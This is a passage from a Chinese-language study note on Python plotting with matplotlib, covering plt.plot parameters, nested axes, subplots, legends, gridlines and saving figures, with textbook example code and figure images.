class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> numpy <span class="token keyword">as</span> np<span class="token keyword">import</span> matplotlib<span class="token punctuation">.</span>pyplot <span class="token keyword">as</span> plt<span class="token comment"># 新建figure</span>fig <span class="token operator">=</span> plt<span class="token punctuation">.</span>figure<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token comment"># 定义数据</span>x <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">,</span> <span class="token number">5</span><span class="token punctuation">,</span> <span class="token number">6</span><span class="token punctuation">,</span> <span class="token number">7</span><span class="token punctuation">]</span>y <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">5</span><span class="token punctuation">,</span> <span class="token number">8</span><span class="token punctuation">,</span> <span class="token number">6</span><span class="token punctuation">]</span><span class="token comment"># 新建区域ax1</span><span class="token comment"># figure的百分比,从figure 10%的位置开始绘制, 宽高是figure的80%</span>left<span class="token punctuation">,</span> bottom<span class="token punctuation">,</span> width<span class="token punctuation">,</span> height <span class="token operator">=</span> <span class="token number">0.1</span><span class="token punctuation">,</span> <span class="token number">0.1</span><span class="token punctuation">,</span> <span class="token number">0.8</span><span class="token punctuation">,</span> <span class="token number">0.8</span><span class="token comment"># 获得绘制的句柄</span>ax1 <span class="token operator">=</span> fig<span class="token punctuation">.</span>add_axes<span class="token punctuation">(</span><span class="token punctuation">[</span>left<span class="token punctuation">,</span> bottom<span class="token punctuation">,</span> width<span class="token punctuation">,</span> height<span class="token punctuation">]</span><span class="token punctuation">)</span>ax1<span class="token punctuation">.</span>plot<span class="token punctuation">(</span>x<span class="token punctuation">,</span> y<span class="token punctuation">,</span> <span class="token string">'r'</span><span class="token punctuation">)</span>ax1<span class="token punctuation">.</span>set_title<span class="token punctuation">(</span><span class="token string">'area1'</span><span class="token punctuation">)</span><span class="token comment"># 新增区域ax2,嵌套在ax1内</span>left<span class="token punctuation">,</span> bottom<span class="token punctuation">,</span> width<span class="token punctuation">,</span> height <span class="token operator">=</span> <span class="token number">0.2</span><span class="token punctuation">,</span> <span class="token number">0.6</span><span class="token punctuation">,</span> <span class="token number">0.25</span><span class="token punctuation">,</span> <span class="token number">0.25</span><span class="token comment"># 获得绘制的句柄</span>ax2 <span class="token operator">=</span> fig<span class="token punctuation">.</span>add_axes<span class="token punctuation">(</span><span class="token punctuation">[</span>left<span class="token punctuation">,</span> bottom<span class="token punctuation">,</span> width<span class="token punctuation">,</span> height<span class="token punctuation">]</span><span class="token punctuation">)</span>ax2<span class="token punctuation">.</span>plot<span class="token punctuation">(</span>x<span class="token punctuation">,</span> y<span class="token punctuation">,</span> <span class="token string">'b'</span><span class="token punctuation">)</span>ax2<span class="token punctuation">.</span>set_title<span class="token punctuation">(</span><span class="token string">'area2'</span><span class="token punctuation">)</span>plt<span class="token punctuation">.</span>show<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://im-so-scared-2.gitee.io/shier_jinghuang/2021/11/06/python%E7%BB%98%E5%9B%BE%E5%8F%8A%E5%8F%AF%E8%A7%86%E5%8C%96%E5%A4%87%E8%AF%BE/Figure_3.png"></p><blockquote><p> 补充知识点，在课本表5—2中出现的函数均有add_函数名(参数)和plt.函数名(参数)两种形式，实际使用中记住一种就行。</p></blockquote><h2 id="5-2-plt-plot-绘图"><a href="#5-2-plt-plot-绘图" class="headerlink" title="5.2 plt.plot()绘图"></a>5.2 plt.plot()绘图</h2><p><strong>plt.plot(x, y, c=”b”,ls=”-“, lw=2, label=“文本串”)</strong><br>其中，第二个简单的格式是最常用的格式，参数x表示指定的x轴上的数值，参数y表示指定的y轴上的数值，参数c指定绘制线条的颜色，参数ls指定的折线图的线条风格，参数lw指定绘制的线条宽度，参数label指定标记图内容的标签文本。</p><p>**plt.plot()<strong>函数中可以明确地给出了x,y的值，然后得到相应的(x,y)坐标点，把这些点再连接成线。当</strong>plt.plot()**函数也允许只给出y值的情况，这时系统给自动将x值指定为range(len(y))，然后根据x,y的值进行点连线。</p><blockquote><p> len() 函数返回对象中项目的数量。 </p></blockquote><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> matplotlib<span class="token punctuation">.</span>pyplot <span class="token keyword">as</span> plt<span class="token comment">#只给出y值，画出相应图像</span>plt<span class="token punctuation">.</span>plot<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">)</span>plt<span class="token punctuation">.</span>show<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>在5.2plt.plot()绘图这一节里，我们以实例5-1为例，</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> matplotlib<span class="token punctuation">.</span>pyplot <span class="token keyword">as</span> pltfig<span class="token operator">=</span>plt<span class="token punctuation">.</span>figure<span class="token punctuation">(</span><span class="token punctuation">)</span>ax <span class="token operator">=</span> fig<span class="token punctuation">.</span>add_axes<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token number">0.1</span><span class="token punctuation">,</span> <span class="token number">0.1</span><span class="token punctuation">,</span> <span class="token number">0.8</span><span class="token punctuation">,</span> <span class="token number">0.8</span><span class="token punctuation">]</span><span class="token punctuation">)</span>x<span class="token operator">=</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">5</span><span class="token punctuation">,</span><span class="token number">6</span><span class="token punctuation">]</span>y<span class="token operator">=</span><span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">5</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">7</span><span class="token punctuation">,</span><span class="token number">9</span><span class="token punctuation">,</span><span class="token number">12</span><span class="token punctuation">]</span>plt<span class="token punctuation">.</span>plot<span class="token punctuation">(</span>x<span class="token punctuation">,</span>y<span class="token punctuation">)</span>plt<span class="token punctuation">.</span>show<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token comment">#带有默认设置的程序</span><span class="token keyword">import</span> matplotlib<span class="token punctuation">.</span>pyplot <span class="token keyword">as</span> pltx<span class="token operator">=</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">5</span><span class="token punctuation">,</span><span class="token number">6</span><span class="token punctuation">]</span>y<span class="token operator">=</span><span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">5</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">7</span><span class="token punctuation">,</span><span class="token number">9</span><span class="token punctuation">,</span><span class="token number">12</span><span class="token punctuation">]</span>plt<span class="token punctuation">.</span>plot<span class="token punctuation">(</span>x<span class="token punctuation">,</span>y<span class="token punctuation">)</span>plt<span class="token punctuation">.</span>show<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token comment">#去除默认值的程序</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>再pycharm环境中允许，生成的图片实际上是一模一样的，这是因为在使用了plt.plot()语句，会默认创建一个figure对象和axes坐标系。</p><p><strong>例5-2</strong></p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> matplotlib<span class="token punctuation">.</span>pyplot <span class="token keyword">as</span> pltx <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">5</span><span class="token punctuation">]</span>y1 <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">5</span><span class="token punctuation">]</span>y2 <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">6</span><span class="token punctuation">,</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token number">10</span><span class="token punctuation">]</span>y3 <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">6</span><span class="token punctuation">,</span><span class="token number">9</span><span class="token punctuation">,</span><span class="token number">12</span><span class="token punctuation">,</span><span class="token number">15</span><span class="token punctuation">]</span>plt<span class="token punctuation">.</span>plot<span class="token punctuation">(</span>x<span class="token punctuation">,</span> y1<span class="token punctuation">,</span> color<span class="token operator">=</span><span class="token string">"g"</span><span class="token punctuation">,</span>linestyle<span class="token operator">=</span><span class="token string">"-"</span><span class="token punctuation">,</span>marker<span class="token operator">=</span><span class="token string">"o"</span><span class="token punctuation">,</span>markerfacecolor<span class="token operator">=</span><span class="token string">"g"</span><span class="token punctuation">,</span>markersize<span class="token operator">=</span><span class="token number">20</span><span class="token punctuation">)</span>plt<span class="token punctuation">.</span>plot<span class="token punctuation">(</span>x<span class="token punctuation">,</span> y2<span class="token punctuation">,</span> color<span class="token operator">=</span><span class="token string">"r"</span><span class="token punctuation">,</span>linestyle<span class="token operator">=</span><span class="token string">":"</span><span class="token punctuation">,</span>marker<span class="token operator">=</span><span class="token string">"D"</span><span class="token punctuation">,</span>markerfacecolor<span class="token operator">=</span><span class="token string">"r"</span><span class="token punctuation">,</span>markersize<span class="token operator">=</span><span class="token number">20</span><span class="token punctuation">)</span>plt<span class="token punctuation">.</span>plot<span class="token punctuation">(</span>x<span class="token punctuation">,</span> y3<span class="token punctuation">,</span> color<span class="token operator">=</span><span class="token string">"b"</span><span class="token punctuation">,</span>linestyle<span class="token operator">=</span><span class="token string">"-."</span><span class="token punctuation">,</span>marker<span class="token operator">=</span><span class="token string">"s"</span><span class="token punctuation">,</span>markerfacecolor<span class="token operator">=</span><span class="token string">"b"</span><span class="token punctuation">,</span>markersize<span class="token operator">=</span><span class="token number">20</span><span class="token punctuation">)</span>plt<span class="token punctuation">.</span>show<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>引例：画一张二次曲线</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> matplotlib<span class="token punctuation">.</span>pyplot <span class="token keyword">as</span> plt<span class="token keyword">import</span> numpy <span class="token keyword">as</span> np<span class="token comment">#从-1到1之间等间隔采66个数.也就是说所画出来的图形是66个点连接得来的</span><span class="token comment">#注意：如果点数过小的话会导致画出来二次函数图像不平滑</span>x <span class="token operator">=</span> np<span class="token punctuation">.</span>linspace<span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span><span class="token number">66</span><span class="token punctuation">)</span><span class="token comment">#linspace(start,stop,num,endpoint= True)函数在[start,stop]范围内计算返回num个均匀间隔的点，可以通过endpoint确认是否包含间隔点</span><span class="token comment"># 绘制x^2函数的图像</span>y <span class="token operator">=</span> x<span class="token operator">**</span><span class="token number">2</span>plt<span class="token punctuation">.</span>plot<span class="token punctuation">(</span>x<span class="token punctuation">,</span> y<span class="token punctuation">)</span>plt<span class="token punctuation">.</span>show<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-python" data-language="python"><code class="language-python">numpy<span class="token punctuation">.</span>random<span class="token punctuation">.</span>randint<span class="token punctuation">(</span>low<span class="token punctuation">,</span> high<span class="token operator">=</span><span class="token boolean">None</span><span class="token punctuation">,</span> size<span class="token operator">=</span><span class="token boolean">None</span><span class="token punctuation">,</span> dtype<span class="token operator">=</span><span class="token string">'l'</span><span class="token punctuation">)</span><span class="token comment">#返回一个随机整型数，范围从低（包括）到高（不包括），即[low, high)。</span><span class="token comment">#如果没有写参数high的值，则返回[0,low)的值。</span><span class="token comment">#输出随机数的尺寸，比如size = (m * n* k)则输出同规模即m * n* k个随机数。默认是None的，仅仅返回满足要求的单一随机数。</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://im-so-scared-2.gitee.io/shier_jinghuang/2021/11/06/python%E7%BB%98%E5%9B%BE%E5%8F%8A%E5%8F%AF%E8%A7%86%E5%8C%96%E5%A4%87%E8%AF%BE/Figure_4.png"></p><p>我们可以看到当图像间隔足够小的时候，折线图可以模拟出二次曲线的形式，类似的方法可以实现正弦函数的产生</p><p><strong>例5-4</strong></p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> matplotlib<span class="token punctuation">.</span>pyplot <span class="token keyword">as</span> plt<span class="token keyword">import</span> numpy <span class="token keyword">as</span> npx <span class="token operator">=</span> np<span class="token punctuation">.</span>linspace<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token operator">*</span>np<span class="token punctuation">.</span>pi<span class="token punctuation">,</span> <span class="token number">100</span><span class="token punctuation">)</span>y <span class="token operator">=</span> np<span class="token punctuation">.</span>sin<span class="token punctuation">(</span>x<span class="token punctuation">)</span>plt<span class="token punctuation">.</span>plot<span class="token punctuation">(</span>x<span class="token punctuation">,</span> y<span class="token punctuation">,</span>c<span class="token operator">=</span><span class="token string">'r'</span><span class="token punctuation">,</span>ls<span class="token operator">=</span><span class="token string">"-"</span><span class="token punctuation">,</span> lw<span class="token operator">=</span><span class="token number">3</span><span class="token punctuation">,</span> label<span class="token operator">=</span><span class="token string">"sin"</span><span class="token punctuation">)</span>plt<span class="token punctuation">.</span>legend<span class="token punctuation">(</span><span class="token punctuation">)</span>plt<span class="token punctuation">.</span>show<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://im-so-scared-2.gitee.io/shier_jinghuang/2021/11/06/python%E7%BB%98%E5%9B%BE%E5%8F%8A%E5%8F%AF%E8%A7%86%E5%8C%96%E5%A4%87%E8%AF%BE/Figure_5.png"></p><p><strong>例5-5</strong></p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> numpy <span class="token keyword">as</span> np<span class="token keyword">import</span> matplotlib<span class="token punctuation">.</span>pyplot <span class="token keyword">as</span> pltt<span class="token operator">=</span> np<span class="token punctuation">.</span>arange<span class="token punctuation">(</span><span class="token number">12</span><span class="token punctuation">)</span>x<span class="token operator">=</span> t<span class="token punctuation">.</span>reshape<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment">#将arange(12)生成的12个数展成[4,3]的二维数组</span>y<span class="token operator">=</span>np<span class="token punctuation">.</span>random<span class="token punctuation">.</span>randint<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">9</span><span class="token punctuation">,</span>size<span class="token operator">=</span><span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">)</span>plt<span class="token punctuation">.</span>plot<span class="token punctuation">(</span>x<span class="token punctuation">,</span>y<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://im-so-scared-2.gitee.io/shier_jinghuang/2021/11/06/python%E7%BB%98%E5%9B%BE%E5%8F%8A%E5%8F%AF%E8%A7%86%E5%8C%96%E5%A4%87%E8%AF%BE/Figure_6.png"></p><h2 id="5-3-划分子图"><a href="#5-3-划分子图" class="headerlink" title="5.3 划分子图"></a>5.3 划分子图</h2><p>例5-7:</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> matplotlib<span class="token punctuation">.</span>pyplot <span class="token keyword">as</span> pltx <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">5</span><span class="token punctuation">,</span><span class="token number">6</span><span class="token punctuation">]</span>y <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">5</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">7</span><span class="token punctuation">,</span><span class="token number">9</span><span class="token punctuation">,</span><span class="token number">12</span><span class="token punctuation">]</span>plt<span class="token punctuation">.</span>plot<span class="token punctuation">(</span>x<span class="token punctuation">,</span>y<span class="token punctuation">)</span>x <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">]</span>y <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">2.0</span><span class="token punctuation">,</span><span class="token number">3.5</span><span class="token punctuation">,</span><span class="token number">4.6</span><span class="token punctuation">]</span>plt<span class="token punctuation">.</span>plot<span class="token punctuation">(</span>x<span class="token punctuation">,</span>y<span class="token punctuation">)</span>plt<span class="token punctuation">.</span>show<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://im-so-scared-2.gitee.io/shier_jinghuang/2021/11/06/python%E7%BB%98%E5%9B%BE%E5%8F%8A%E5%8F%AF%E8%A7%86%E5%8C%96%E5%A4%87%E8%AF%BE/Figure_7.png"></p><p>在这个情况下，两个折线是被默认存储到同一个画布上，然而我们在中间多添加一个plt.show()就会是分别位于一张画布上。在这个实例中也能看出来在，两张图片的X轴范围不同的情况下，放在同一张画布下是不容易显示的.</p><p>为此我们要进行划分子图</p><p>格式一：**plt.subplot(nrows,ncols,plot_number)**将一个画布分成“行×列”个部分，其中nrows表示要划分的行数，ncols表示要划分的列数，plot_number表示当前子图区。</p><p>格式二：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">figure <span class="token operator">=</span> plt<span class="token punctuation">.</span>figure<span class="token punctuation">(</span><span class="token punctuation">)</span>figure<span class="token punctuation">.</span>add_subplot<span class="token punctuation">(</span>nrows<span class="token punctuation">,</span>ncols<span class="token punctuation">,</span>plot_number<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><strong>实例5-8 : 一个figure对象画风两个子图实例</strong></p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> matplotlib<span class="token punctuation">.</span>pyplot <span class="token keyword">as</span> pltx <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">5</span><span class="token punctuation">,</span><span class="token number">6</span><span class="token punctuation">]</span>y <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">5</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">7</span><span class="token punctuation">,</span><span class="token number">9</span><span class="token punctuation">,</span><span class="token number">12</span><span class="token punctuation">]</span>figure <span class="token operator">=</span> plt<span class="token punctuation">.</span>figure<span class="token punctuation">(</span><span class="token punctuation">)</span>axes1 <span class="token operator">=</span> figure<span class="token punctuation">.</span>add_subplot<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span>plt<span class="token punctuation">.</span>plot<span class="token punctuation">(</span>x<span class="token punctuation">,</span>y<span class="token punctuation">)</span>x <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">]</span>y <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">2.0</span><span class="token punctuation">,</span><span class="token number">3.5</span><span class="token punctuation">,</span><span class="token number">4.6</span><span class="token punctuation">]</span>axes2 <span class="token operator">=</span> figure<span class="token punctuation">.</span>add_subplot<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">)</span>plt<span class="token punctuation">.</span>plot<span class="token punctuation">(</span>x<span class="token punctuation">,</span>y<span class="token punctuation">)</span>plt<span class="token punctuation">.</span>show<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>以格式一重写代码：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> matplotlib<span class="token punctuation">.</span>pyplot <span class="token keyword">as</span> pltx <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">5</span><span class="token punctuation">,</span><span class="token number">6</span><span class="token punctuation">]</span>y <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">5</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">7</span><span class="token punctuation">,</span><span class="token number">9</span><span class="token punctuation">,</span><span class="token number">12</span><span class="token punctuation">]</span>figure <span class="token operator">=</span> plt<span class="token punctuation">.</span>figure<span class="token punctuation">(</span><span class="token punctuation">)</span>plt<span class="token punctuation">.</span>subplot<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span>plt<span class="token punctuation">.</span>plot<span class="token punctuation">(</span>x<span class="token punctuation">,</span>y<span class="token punctuation">)</span><span class="token comment">#补充一点课本上出现了两次的plt.show这可能是教材编写老师的失误，因为两编plt.show是得不到目标格式的</span>x <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">]</span>y <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">2.0</span><span class="token punctuation">,</span><span class="token number">3.5</span><span class="token punctuation">,</span><span class="token number">4.6</span><span class="token punctuation">]</span>plt<span class="token punctuation">.</span>subplot<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">)</span>plt<span class="token punctuation">.</span>plot<span class="token punctuation">(</span>x<span class="token punctuation">,</span>y<span class="token punctuation">)</span>plt<span class="token punctuation">.</span>show<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://im-so-scared-2.gitee.io/shier_jinghuang/2021/11/06/python%E7%BB%98%E5%9B%BE%E5%8F%8A%E5%8F%AF%E8%A7%86%E5%8C%96%E5%A4%87%E8%AF%BE/Figure_8.png"></p><p><strong>例5-9：设置绘图的各种参数实例</strong></p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> matplotlib<span class="token punctuation">.</span>pyplot <span class="token keyword">as</span> plt<span class="token comment">#以下两句代码的作用是显示汉字图标题</span>plt<span class="token punctuation">.</span>rcParams<span class="token punctuation">[</span><span class="token string">'font.sans-serif'</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">'SimHei'</span><span class="token punctuation">]</span>plt<span class="token punctuation">.</span>rcParams<span class="token punctuation">[</span><span class="token string">'axes.unicode_minus'</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token boolean">False</span><span class="token comment">#创建figure对象，划分子图</span>figure <span class="token operator">=</span> plt<span class="token punctuation">.</span>figure<span class="token punctuation">(</span><span class="token punctuation">)</span>axes1 <span class="token operator">=</span> figure<span class="token punctuation">.</span>add_subplot<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span>axes2 <span class="token operator">=</span> figure<span class="token punctuation">.</span>add_subplot<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token comment">#指定x,y列表值</span>x <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">5</span><span class="token punctuation">,</span><span class="token number">6</span><span class="token punctuation">]</span>y <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">5</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">7</span><span class="token punctuation">,</span><span class="token number">9</span><span class="token punctuation">,</span><span class="token number">12</span><span class="token punctuation">]</span>axes1<span class="token punctuation">.</span>plot<span class="token punctuation">(</span>x<span class="token punctuation">,</span>y<span class="token punctuation">)</span><span class="token comment">#设置子图2的基本元素</span>axes2<span class="token punctuation">.</span>set_title<span class="token punctuation">(</span><span class="token string">'图标题'</span><span class="token punctuation">)</span>axes2<span class="token punctuation">.</span>set_xlabel<span class="token punctuation">(</span><span class="token string">'x轴标题'</span><span class="token punctuation">)</span>axes2<span class="token punctuation">.</span>set_ylabel<span class="token punctuation">(</span><span class="token string">'y轴标题'</span><span class="token punctuation">)</span><span class="token comment">#设置坐标轴范围</span>axes2<span class="token punctuation">.</span>set_xlim<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">5</span><span class="token punctuation">)</span>axes2<span class="token punctuation">.</span>set_ylim<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">10</span><span class="token punctuation">)</span><span class="token comment">#设置绘制的线型和颜色及标注内容</span>plot1<span class="token operator">=</span>axes2<span class="token punctuation">.</span>plot<span class="token punctuation">(</span>x<span class="token punctuation">,</span>y<span class="token punctuation">,</span>marker<span class="token operator">=</span><span class="token string">'o'</span><span class="token punctuation">,</span>color<span class="token operator">=</span><span class="token string">'r'</span><span class="token punctuation">,</span>label<span class="token operator">=</span><span class="token string">'点型红色'</span><span class="token punctuation">)</span>plot2<span class="token operator">=</span>axes2<span class="token punctuation">.</span>plot<span class="token punctuation">(</span>x<span class="token punctuation">,</span>y<span class="token punctuation">,</span>linestyle<span class="token operator">=</span><span class="token string">'--'</span><span class="token punctuation">,</span>color<span class="token operator">=</span><span class="token string">'b'</span><span class="token punctuation">,</span>label<span class="token operator">=</span><span class="token string">'线型蓝色'</span><span class="token punctuation">)</span>axes2<span class="token punctuation">.</span>legend<span class="token punctuation">(</span>loc<span class="token operator">=</span><span class="token string">'upper left'</span><span class="token punctuation">)</span> <span class="token comment">#在指定位置显示标注</span><span class="token comment">#显示网格绘制子图2</span>axes2<span class="token punctuation">.</span>grid<span class="token punctuation">(</span>b<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">,</span>which<span class="token operator">=</span><span class="token string">'major'</span><span class="token punctuation">,</span>axis<span class="token operator">=</span><span class="token string">'both'</span><span class="token punctuation">,</span>alpha<span class="token operator">=</span> <span class="token number">0.5</span><span class="token punctuation">,</span>color<span class="token operator">=</span><span class="token string">'skyblue'</span><span class="token punctuation">,</span>linestyle<span class="token operator">=</span><span class="token string">'--'</span><span class="token punctuation">,</span>linewidth<span class="token operator">=</span><span class="token number">2</span><span class="token punctuation">)</span>axes2<span class="token punctuation">.</span>plot<span class="token punctuation">(</span>x<span class="token punctuation">,</span>y<span class="token punctuation">)</span>plt<span class="token punctuation">.</span>savefig<span class="token punctuation">(</span><span class="token string">'tu1.jpg'</span><span class="token punctuation">,</span>dpi<span class="token operator">=</span><span class="token number">300</span><span class="token punctuation">)</span> <span class="token comment">#保存图形</span>plt<span class="token punctuation">.</span>show<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" 